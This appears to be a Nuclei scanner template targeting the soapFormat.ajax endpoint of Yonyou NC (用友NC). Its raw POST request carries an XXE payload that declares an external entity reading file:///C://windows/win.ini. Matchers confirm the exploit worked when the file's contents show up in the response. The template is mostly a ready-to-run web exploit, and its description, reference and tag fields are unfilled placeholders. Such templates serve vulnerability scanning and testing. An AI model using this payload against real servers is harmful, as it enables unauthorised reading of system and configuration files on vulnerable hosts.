content:
id: yongyouNC-soapFormat-xxe

info:
  name: 用友NC soapFormat XXE
  author: stg
  severity: high
  description: description
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |-
        POST /uapws/soapFormat.ajax HTTP/1.1
        Host: {{Hostname}}
        accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Cookie: JSESSIONID=61F6B2722B36CB7922E051188F392242.server
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 260

        msg=<!DOCTYPE foo[<!ENTITY xxeltwo SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Serverr%26xxeltwo%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'extensions'
          - 'ENTITY xxeltwo SYSTEM'
          - 'mci extensions'
        condition: or

      - type: status
        status:
          - 200
author: wdnmd0399
